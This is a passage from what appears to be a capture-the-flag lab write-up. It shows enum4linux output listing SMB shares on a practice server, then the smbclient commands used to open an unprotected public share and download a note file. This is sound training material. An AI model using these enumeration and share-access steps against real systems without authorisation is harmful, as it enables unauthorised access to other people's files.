Reconnecting with SMB1 for workgroup listing.

    Server               Comment
    ---------            -------

    Workgroup            Master
    ---------            -------
    TBFC-SMB-01          TBFC-SMB

[+] Attempting to map shares on <ip>
//<ip>/tbfc-hr	Mapping: DENIED, Listing: N/A
//<ip>/tbfc-it	Mapping: DENIED, Listing: N/A
//<ip>/<share>	Mapping: OK, Listing: OK

enum4linux complete on Fri Jan 22 13:48:31 2021{% endraw %}{% endcapture %} {% include code.html code=code%}

Use `smbclient` to access the public share which was discovered previously.
{% capture code %}{% raw %}smbclient //<ip>/<share>{% endraw %}{% endcapture %} {% include code.html code=code%}

An output similar to below will be obtained.
{% capture code %}{% raw %}Enter WORKGROUP\root's password:
Try "help" to get a list of possible commands.

smb: \> ls
.                                   D        0  Thu Nov 12 02:12:07 2020
..                                  D        0  Thu Nov 12 01:32:21 2020
<directory>                         D        0  Thu Nov 12 02:10:41 2020
note_from_mcskidy.txt               N      143  Thu Nov 12 02:12:07 2020

        10252564 blocks of size 1024. 5368132 blocks available

smb: \> mget note_from_mcskidy.txt
Get file note_from_mcskidy.txt? y
getting file \note_from_mcskidy.txt of size 143 as note_from_mcskidy.txt (46.5 KiloBytes/sec) (average 46.5 KiloBytes/sec)

smb: \> exit{% endraw %}{% endcapture %} {% include code.html code=code%}

